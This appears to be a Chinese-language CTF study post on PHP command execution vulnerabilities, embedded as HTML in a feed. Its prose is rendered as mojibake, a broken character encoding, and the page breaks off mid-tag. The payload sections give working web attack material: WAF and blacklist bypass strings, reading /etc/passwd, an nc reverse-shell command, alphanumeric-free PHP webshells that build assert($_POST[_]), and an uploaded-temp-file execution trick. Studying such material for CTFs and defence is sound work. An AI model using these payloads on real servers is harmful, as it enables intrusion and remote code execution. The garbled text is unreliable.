        <content type="html"><![CDATA[<h1 id="å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰</h1><h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><p>php å¸¸è§çš„è°ƒç”¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°</p><p>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</p><ol><li>system(args)â€“æœ‰å›æ˜¾</li><li>shell_exec(args)â€“æ— å›æ˜¾å¿…é¡»è¾“å‡º</li><li>passthru()</li><li>popen(handle,mode)â€“æ— å›æ˜¾</li><li>exec(args)â€“å›æ˜¾æœ€åä¸€è¡Œï¼Œå¿…é¡»åŠ echoè¾“å‡º</li><li><strong>proc_open()</strong></li><li><strong>`(åå•å¼•å·)</strong></li></ol><p>åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼Œä½¿ç”¨åå¼•å·è¿ç®—ç¬¦â€œ`â€çš„æ•ˆæœä¸å‡½æ•° shell_exec() ç›¸åŒã€‚</p><p>phpä»£ç æ‰§è¡Œ</p><ol><li>assert()a</li><li>preg_replace ( $pattern ,$replacement ,  $subject [,  $limit = -1 [, &amp;$count ]] )</li></ol><p>æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚å½“ä½¿ç”¨è¢«å¼ƒç”¨çš„ e ä¿®é¥°ç¬¦æ—¶, è¿™ä¸ªå‡½æ•°ä¼šè½¬ä¹‰ä¸€äº›å­—ç¬¦ï¼Œåœ¨å®Œæˆæ›¿æ¢åï¼Œå¼•æ“ä¼šå°†ç»“æœå­—ç¬¦ä¸²ä½œä¸ºphpä»£ç ä½¿ç”¨evalæ–¹å¼è¿›è¡Œè¯„ä¼°å¹¶å°†è¿”å›å€¼ä½œä¸ºæœ€ç»ˆå‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²</p><ol><li>eval()</li><li>call_user_func (  $callback [, $parameter [, $â€¦ ]] )</li></ol><p>ç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚ ä¼ å…¥call_user_func()çš„å‚æ•°ä¸èƒ½ä¸ºå¼•ç”¨ä¼ é€’ã€‚</p><ol><li><strong>call_user_func_array($<strong><strong>callback</strong></strong>,$param_arr)</strong></li></ol><p>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸º<strong>å›è°ƒå‡½æ•°<strong><strong>ï¼ˆ</strong></strong>callback****ï¼‰</strong>è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥string </p><ol><li>create_function ( $args , $code )</li></ol><p>è¯¥å‡½æ•°çš„å†…éƒ¨å®ç°ç”¨åˆ°äº†<code>eval</code>ã€‚ç¬¬ä¸€ä¸ªå‚æ•°<code>args</code>æ˜¯åé¢å®šä¹‰å‡½æ•°çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°çš„ä»£ç ã€‚</p><ol><li>array_map ( callable $callback ,  $array1 [,  $â€¦ ] )</li></ol><p>ä½œç”¨æ˜¯ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•° ã€‚å…¶è¿”å›å€¼ä¸ºæ•°ç»„ï¼Œæ˜¯ä¸º array1 æ¯ä¸ªå…ƒç´ åº”ç”¨ callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚ callback å‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™ array_map() æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚</p><p>ç¤ºä¾‹</p><pre class="language-none"><code class="language-none">&lt;?php        $a = $_GET['chybeta'];        $b = create_function('$a',"echo $a");        $b('');?&gt;http://localhost:2500/codeexec.php?chybeta=phpinfo();&lt;?php        $array = array(0,1,2,3,4,5);        array_map($_GET['chybeta'],$array);?&gt;http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p><strong>ï¼ˆ1ï¼‰ç®¡é“æ“ä½œ</strong></p><p>å°†ä¸€ç«¯çš„å‘½ä»¤è¾“å‡ºäº¤ç»™å¦ä¸€ç«¯çš„å‘½ä»¤å¤„ç†ã€‚æ ¼å¼ï¼š    å‘½ä»¤1  |  å‘½ä»¤2    </p><p>å¦‚ï¼šps aux | grep httpd</p><p><strong>ï¼ˆ2ï¼‰é‡å®šå‘</strong></p><p>æ”¹å˜æ‰§è¡Œå‘½ä»¤æ—¶çš„é»˜è®¤è¾“å…¥è¾“å‡º</p><p>ç±»å‹æ“ä½œç¬¦ç”¨é€”</p><p>é‡å®šå‘è¾“å…¥                      &lt;                                  ä»æŒ‡å®šæ–‡ä»¶è¯»å–æ•°æ®è€Œä¸æ˜¯ä»é”®ç›˜è¯»å–</p><p>é‡å®šå‘è¾“å‡º                     &gt;   æˆ–&gt;&gt;                      å°†è¾“å‡ºç»“æœè¦†ç›–ã€è¿½åŠ åˆ°æŒ‡å®šæ–‡ä»¶ï¼ˆ&gt;è¦†ç›–ã€&gt;&gt;è¿½åŠ ï¼‰</p><p>é‡å®šå‘æ ‡å‡†é”™è¯¯è¾“å‡º     2&gt;æˆ– 2&gt;&gt;                 å°†é”™è¯¯ä¿¡æ¯è¦†ç›–æˆ–è¿½åŠ åˆ°æŒ‡å®šæ–‡ä»¶</p><p>é‡å®šå‘æ··åˆè¾“å‡º             &amp;&gt; æˆ– &amp;&gt;&gt;               å°†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯ä¿¡æ¯è¦†ç›–æˆ–è¿½åŠ åˆ°æŒ‡å®šæ–‡ä»¶</p><p><strong>ï¼ˆ3)é€»è¾‘åˆ†å‰²</strong></p><p>å¤„ç†å¤šæ¡å‘½ä»¤ä¹‹é—´çš„é€»è¾‘å…³ç³»</p><p>é€»è¾‘ä¸                      &amp;&amp;      ä¸¤æ¡å‘½ä»¤éƒ½è¦æ‰§è¡Œ</p><p>é€»è¾‘æˆ–                     ||           è‹¥ç¬¬ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œåˆ™ä¸æ‰§è¡Œç¬¬äºŒæ¡å‘½ä»¤ï¼ˆå³åªè¦æœ‰ä¸€æ¡å‘½ä»¤æˆåŠŸå°±ä¸å†ç»§ç»­æ‰§è¡Œå‘½ä»¤ï¼‰</p><p>é¡ºåºæ‰§è¡Œ               ;              æ‰§è¡Œå®Œç¬¬ä¸€æ¡å‘½ä»¤åæ‰§è¡Œç¬¬äºŒæ¡å‘½ä»¤</p><p>ä½œç”¨</p><ol><li>è¯»å–æ•æ„Ÿæ–‡ä»¶   /etc/passwd</li><li>NCåå¼¹shell</li></ol><p>nc -e /bin/bash 127.0.0.1 3737</p><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><p>Bash æ˜¯GNUæ“ä½œç³»ç»Ÿçš„ shell æˆ–å‘½ä»¤è¯­è¨€è§£é‡Šå™¨</p><h2 id="WAF-ç»•è¿‡"><a href="#WAF-ç»•è¿‡" class="headerlink" title="WAF****ç»•è¿‡"></a><strong>WAF****ç»•è¿‡</strong></h2><h3 id="å¸¸è§çš„æ›¿æ¢"><a href="#å¸¸è§çš„æ›¿æ¢" class="headerlink" title="å¸¸è§çš„æ›¿æ¢"></a>å¸¸è§çš„æ›¿æ¢</h3><p>ç©ºæ ¼</p><blockquote><p>&gt;     &lt;       &lt;&gt;</p></blockquote><p>shellä¸‹ç‰¹æ®Šç¬¦å·</p><p>$(base64ç¼–ç å†…å®¹|d -base64)</p><h3 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a><strong>é€šé…ç¬¦</strong></h3><p>åœ¨bashçš„æ“ä½œç¯å¢ƒä¸­æœ‰ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œé‚£å°±æ˜¯é€šé…ç¬¦ï¼Œä¸‹é¢åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„é€šé…ç¬¦ï¼š</p><pre class="language-none"><code class="language-none">*    ä»£è¡¨ã€ 0 ä¸ªåˆ°æ— ç©·å¤šä¸ªã€ä»»æ„å­—ç¬¦?    ä»£è¡¨ã€ä¸€å®šæœ‰ä¸€ä¸ªã€ä»»æ„å­—ç¬¦[ ]    åŒæ ·ä»£è¡¨ã€ä¸€å®šæœ‰ä¸€ä¸ªåœ¨æ‹¬å·å†…ã€çš„å­—ç¬¦(éä»»æ„å­—ç¬¦)ã€‚ä¾‹å¦‚ [abcd] ä»£è¡¨ã€ä¸€å®šæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œ å¯èƒ½æ˜¯ a, b, c, d è¿™å››ä¸ªä»»ä½•ä¸€ä¸ªã€[ - ]    è‹¥æœ‰å‡å·åœ¨ä¸­æ‹¬å·å†…æ—¶ï¼Œä»£è¡¨ã€åœ¨ç¼–ç é¡ºåºå†…çš„æ‰€æœ‰å­—ç¬¦ã€ã€‚ä¾‹å¦‚ [0-9] ä»£è¡¨ 0 åˆ° 9 ä¹‹é—´çš„æ‰€æœ‰æ•°å­—ï¼Œå› ä¸ºæ•°å­—çš„è¯­ç³»ç¼–ç æ˜¯è¿ç»­çš„ï¼[^ ]    è‹¥ä¸­æ‹¬å·å†…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºæŒ‡æ•°ç¬¦å· (^) ï¼Œé‚£è¡¨ç¤ºã€åå‘é€‰æ‹©ã€ï¼Œä¾‹å¦‚ [^abc] ä»£è¡¨ ä¸€å®šæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œåªè¦æ˜¯é a, b, c çš„å…¶ä»–å­—ç¬¦å°±æ¥å—çš„æ„æ€ã€‚</code></pre><h3 id="è¿æ¥ç¬¦"><a href="#è¿æ¥ç¬¦" class="headerlink" title="è¿æ¥ç¬¦"></a><strong>è¿æ¥ç¬¦</strong></h3><p>å¼•å·è¿æ¥ï¼Œæ³¨æ„è¦é—­åˆå¥½</p><p>å•å¼•å·</p><p>/â€˜bâ€™iâ€™nâ€™/â€˜câ€™aâ€™tâ€™ /â€˜eâ€™tâ€™câ€™/â€˜pâ€™aâ€™sâ€™sâ€™wâ€™d</p><p>åŒå¼•å·</p><p>/â€œbâ€iâ€nâ€/â€œwâ€hâ€iâ€câ€hâ€ â€œnâ€c</p><p>åæ–œæ†</p><p>/b\i\n/w\h\i\c\h n\c</p><h3 id="æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡"><a href="#æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡"></a>æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡</h3><h4 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a><strong>ç©ºæ ¼ç»•è¿‡</strong></h4><ul><li><code>&lt;</code> ç¬¦å· <code>cat&lt;123</code></li><li><code>\t</code> / <code>%09</code></li><li><code>${IFS}</code> å…¶ä¸­{}ç”¨æ¥æˆªæ–­ï¼Œæ¯”å¦‚cat$IFS2ä¼šè¢«è®¤ä¸ºIFS2æ˜¯å˜é‡åã€‚å¦å¤–ï¼Œåœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä¸€èˆ¬ç”¨$9ï¼Œå› ä¸º$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²</li></ul><h4 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a><strong>é»‘åå•ç»•è¿‡</strong></h4><ul><li><code>a=l;b=s;$a$b</code></li><li>base64 <code>echo "bHM=" | base64 -d</code></li><li><code>/?in/?s</code> =&gt; <code>/bin/ls</code></li><li>è¿æ¥ç¬¦ <code>cat /etc/pass'w'd</code></li><li>æœªå®šä¹‰çš„åˆå§‹åŒ–å˜é‡ <code>cat$x /etc/passwd</code></li></ul><h2 id="æ— å­—æ¯-æ•°å­—-RCE"><a href="#æ— å­—æ¯-æ•°å­—-RCE" class="headerlink" title="æ— å­—æ¯(æ•°å­—)RCE"></a>æ— å­—æ¯(æ•°å­—)RCE</h2><p>æ¨èpç¥çš„æ–‡ç« â€“<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>åˆ©ç”¨å„ç§éæ•°å­—å­—æ¯çš„å­—ç¬¦ï¼Œç»è¿‡å„ç§å˜æ¢ï¼ˆå¼‚æˆ–ã€å–åã€è‡ªå¢ï¼‰ï¼Œæ„é€ å‡ºå•ä¸ªçš„å­—æ¯å­—ç¬¦ï¼Œç„¶åæŠŠå•ä¸ªå­—ç¬¦æ‹¼æ¥æˆä¸€ä¸ªå‡½æ•°åï¼Œæ¯”å¦‚è¯´<code>assert</code>ï¼Œç„¶åå°±å¯ä»¥åŠ¨æ€æ‰§è¡Œäº†ã€‚æ‰€ä»¥è¯´è¿™é‡Œçš„æ ¸å¿ƒå°±æ˜¯è¦å°†éå­—æ¯çš„å­—ç¬¦å˜æ¢æˆå­—æ¯å­—ç¬¦ã€‚</p><h3 id="1-å¼‚æˆ–"><a href="#1-å¼‚æˆ–" class="headerlink" title="1.å¼‚æˆ– ^"></a>1.å¼‚æˆ– ^</h3><p>æŒ‡çš„æ˜¯phpæŒ‰ä½å¼‚æˆ–ï¼Œåœ¨phpä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œåï¼Œå¾—åˆ°çš„ä¾ç„¶æ˜¯<strong>ä¸€ä¸ªå­—ç¬¦</strong>ï¼Œå½“æˆ‘ä»¬æƒ³å¾—åˆ°<code>a-z</code>ä¸­æŸä¸ªå­—æ¯æ—¶ï¼Œå°±å¯ä»¥æ‰¾åˆ°ä¸¤ä¸ªéå­—æ¯æ•°å­—çš„å­—ç¬¦ï¼Œåªè¦ä»–ä»¬ä¿©çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚è€Œåœ¨phpä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²è½¬æ¢æˆ<code>asciiç </code>å€¼ï¼Œå†å°†è¿™ä¸ªå€¼è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œç„¶åä¸€ä½ä¸€ä½çš„è¿›è¡ŒæŒ‰ä½å¼‚æˆ–ï¼Œå¼‚æˆ–çš„è§„åˆ™æ˜¯ï¼š<code>1^1=0,1^0=1,0^1=1,0^0=0</code>ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯<strong>ç›¸åŒä¸ºé›¶ï¼Œä¸åŒä¸ºä¸€</strong></p><p>å› ä¸ºå¾ˆå¤šéƒ½æ˜¯ä¸å¯è§çš„å­—ç¬¦ï¼Œæ‰€ä»¥è¯´æˆ‘å°±å…ˆurlç¼–ç äº†ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">a:'%40'^'%21' ; s:'%7B'^'%08' ; s:'%7B'^'%08' ; e:'%7B'^'%1E' ; r:'%7E'^'%0C' ; t:'%7C'^'%08'P:'%0D'^'%5D' ; O:'%0F'^'%40' ; S:'%0E'^'%5D' ; T:'%0B'^'%5F'æ‹¼æ¥èµ·æ¥ï¼š$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08'); //$_=assert$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');  //$__=_POST$___=$$__; $___=$_POST$_($___[_]);//assert($_POST[_]);æ”¾åˆ°ä¸€æ’å°±æ˜¯ï¼š$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');$__='_'.('%0D'^'%5D').('%0F'^'%40').('%0E'^'%5D').('%0B'^'%5F');$___=$$__;$_($___[_]);</code></pre><h3 id="2-å–å"><a href="#2-å–å" class="headerlink" title="2.å–å ~"></a>2.å–å ~</h3><p>ä¸€ä¸ªå­—ç¬¦å–åä¹‹åéƒ½ä¼šå˜æˆå¦ä¸€ä¸ªå­—ç¬¦ï¼Œä¸åƒå¼‚æˆ–éœ€è¦ä¸¤ä¸ªå­—ç¬¦æ‰èƒ½æ„é€ å‡ºä¸€ä¸ªå­—ç¬¦ã€‚</p><p>æœ‰å‚æ•°å‡½æ•°è¦åˆ†å¼€è¿ç®—</p><p>å¦‚</p><pre class="language-none"><code class="language-none">system('ls /');(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0); </code></pre><p>åˆ©ç”¨çš„æ˜¯UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œæ¯”å¦‚<code>'å’Œ'{2}</code>çš„ç»“æœæ˜¯<code>"\x8c"</code>ï¼Œå…¶å–åå³ä¸ºå­—æ¯<code>s</code></p><h3 id="3-è‡ªå¢"><a href="#3-è‡ªå¢" class="headerlink" title="3.è‡ªå¢"></a>3.è‡ªå¢</h3><p>åªè¦æˆ‘ä»¬è·å¾—äº†å°å†™å­—æ¯<code>a</code>ï¼Œå°±å¯ä»¥é€šè¿‡è‡ªå¢è·å¾—æ‰€æœ‰å°å†™å­—æ¯ï¼Œå½“æˆ‘ä»¬è·å¾—å¤§å†™å­—æ¯<code>A</code>ï¼Œå°±å¯ä»¥è·å¾—æ‰€æœ‰å¤§å†™å­—æ¯äº†</p><p>æ•°ç»„(Array)ä¸­å°±æ­£å¥½æœ‰å¤§å†™å­—æ¯<code>A</code>å’Œå°å†™å­—æ¯<code>a</code>ï¼Œè€Œåœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°±ä¼šè¢«å¼ºåˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå®ƒçš„å€¼å°±ä¸º<code>Array</code>ï¼Œé‚£å–å®ƒçš„ç¬¬ä¸€ä¸ªå­æ¯ï¼Œå°±æ‹¿åˆ°<code>A</code>äº†ï¼Œé‚£æœ‰äº†<code>a</code>å’Œ<code>A</code>ï¼Œç›¸å½“äºæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°<code>a-z</code>å’Œ<code>A-Z</code>ä¸­çš„æ‰€æœ‰å­—æ¯äº†</p><pre class="language-none"><code class="language-none">&lt;?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>åœ¨php7ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨($a)()è¿™ç§æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚(call_user_func)(system,whoami,â€™â€™)</p><p>php7ç‰¹æ€§</p><pre class="language-none"><code class="language-none">&lt;?php'var_dump'('1111'); ("VAR_DUMP")("llll"); echo $_GET[ss];echo $_GET['1'] . '&lt;br/&gt;';echo $_GET[1];$a = '_GET';echo $$a[1];echo `pwd`;</code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="4-ä¸´æ—¶æ–‡ä»¶"><a href="#4-ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="4.ä¸´æ—¶æ–‡ä»¶"></a>4.<strong>ä¸´æ—¶æ–‡ä»¶</strong></h3><p>åˆ©ç”¨é€šé…ç¬¦</p><p>ç”¨<code>. file</code>æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸éœ€è¦fileæœ‰xæƒé™çš„ã€‚é‚£ä¹ˆï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„æ–‡ä»¶ï¼Œ</p><p>è¿™ä¸ªæ–‡ä»¶ä¹Ÿå¾ˆå¥½å¾—åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚</p><p>æ‰€æœ‰æ–‡ä»¶åéƒ½æ˜¯å°å†™ï¼Œåªæœ‰PHPç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å¤§å†™å­—æ¯ã€‚é‚£ä¹ˆç­”æ¡ˆå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œæˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è¡¨ç¤ºâ€œå¤§å†™å­—æ¯â€çš„globé€šé…ç¬¦ï¼Œå°±èƒ½ç²¾å‡†æ‰¾åˆ°æˆ‘ä»¬è¦æ‰§è¡Œçš„æ–‡ä»¶ã€‚</p><p>ç¿»å¼€asciiç è¡¨ï¼Œå¯è§å¤§å†™å­—æ¯ä½äº<code>@</code>ä¸<code>[</code>ä¹‹é—´ï¼š</p><p>å½“ç„¶ï¼Œphpç”Ÿæˆä¸´æ—¶æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸ä¸€å®šæ˜¯å¤§å†™å­—æ¯ï¼Œä¸è¿‡å¤šå°è¯•å‡ æ¬¡ä¹Ÿå°±è¡Œäº†ã€‚</p><p>æœ€åï¼Œæˆ‘ä¼ å…¥çš„codeä¸º<code>?&gt;&lt;?=. /???/????????[@-[];?&gt;</code>ï¼Œå‘é€æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>æˆåŠŸæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h2 id="æ— å‚æ•°RCE"><a href="#æ— å‚æ•°RCE" class="headerlink" title="æ— å‚æ•°RCE"></a>æ— å‚æ•°RCE</h2><p>æ— å‚rceï¼Œå°±æ˜¯è¯´åœ¨æ— æ³•ä¼ å…¥å‚æ•°çš„æƒ…å†µä¸‹ï¼Œä»…ä»…ä¾é ä¼ å…¥æ²¡æœ‰å‚æ•°çš„å‡½æ•°å¥—å¨ƒå°±å¯ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œè¿™åœ¨ctfä¸­ä¹Ÿç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„è€ƒç‚¹ï¼Œæ¥ä¸‹æ¥å°±æ¥è¯¦ç»†æ€»ç»“æ€»ç»“å®ƒçš„åˆ©ç”¨å§¿åŠ¿</p><h2 id="æ ¸å¿ƒä»£ç "><a href="#æ ¸å¿ƒä»£ç " class="headerlink" title="æ ¸å¿ƒä»£ç "></a>æ ¸å¿ƒä»£ç </h2><pre class="language-none"><code class="language-none">if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {  eval($_GET['code']);}</code></pre><p>è¿™æ®µä»£ç çš„æ ¸å¿ƒå°±æ˜¯åªå…è®¸å‡½æ•°è€Œä¸å…è®¸å‡½æ•°ä¸­çš„å‚æ•°ï¼Œå°±æ˜¯è¯´ä¼ è¿›å»çš„å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ¥ä¸€ä¸ª<code>()</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—ç¬¦ä¸²å°±ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œå¦‚æœæ›¿æ¢ååªå‰©ä¸‹<code>;</code>ï¼Œé‚£ä¹ˆè¿™æ®µä»£ç å°±ä¼šè¢«<code>eval</code>æ‰§è¡Œã€‚è€Œä¸”å› ä¸ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ˜¯é€’å½’è°ƒç”¨çš„ï¼Œæ‰€ä»¥è¯´åƒ<code>a(b(c()));</code>ç¬¬ä¸€æ¬¡åŒ¹é…åå°±è¿˜å‰©ä¸‹<code>a(b());</code>ï¼Œç¬¬äºŒæ¬¡åŒ¹é…åå°±è¿˜å‰©<code>a();</code>ï¼Œç¬¬ä¸‰æ¬¡åŒ¹é…åå°±è¿˜å‰©<code>;</code>äº†ï¼Œæ‰€ä»¥è¯´è¿™ä¸€ä¸²<code>a(b(c()));</code>å°±ä¼šè¢«<code>eval</code>æ‰§è¡Œï¼Œä½†ç›¸åï¼Œåƒ<code>a(b('111'));</code>è¿™ç§å­˜åœ¨å‚æ•°çš„å°±ä¸è¡Œï¼Œå› ä¸ºæ— è®ºæ­£åˆ™åŒ¹é…å¤šå°‘æ¬¡å®ƒçš„å‚æ•°æ€»æ˜¯å­˜åœ¨çš„ã€‚é‚£å‡å¦‚é‡åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å°±åªèƒ½ä½¿ç”¨æ²¡æœ‰å‚æ•°çš„phpå‡½æ•°ï¼Œä¸‹é¢å°±æ¥å…·ä½“ä»‹ç»ä¸€ä¸‹ï¼š</p><h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" 